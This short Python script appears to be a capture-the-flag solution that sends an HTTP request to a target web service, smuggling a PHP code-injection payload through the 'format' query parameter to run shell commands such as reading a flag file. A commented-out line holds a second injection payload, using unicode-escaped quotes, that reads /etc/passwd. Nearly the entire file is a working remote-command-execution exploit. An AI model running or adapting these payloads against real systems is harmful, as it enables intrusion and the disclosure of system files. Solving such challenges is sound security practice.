import requests

#cmd = "ls ../"
cmd = "cat ../flagEEgeD"
url="http://46.101.33.243:30278/?format="
url+=cmd
url+="${system("
for i in range(0,len(cmd)):
    url+="$this->format[{}]".format(i)
    if(i < len(cmd)-1): url+="."
url+=")}"
#ls${system($this-%3Eformat[0].$this-%3Eformat[1])}
#url = "http://172.17.0.1:1337/?format=%bf%22);%20$time%20=%20system(%bf%22cat%20/etc/passwd%bf%22);%23".replace("%af%22",u"\uaf22").replace("%bf%22",u"\ubf22")
r = requests.get(url)
print(r.text[0:r.text.find("<html>")])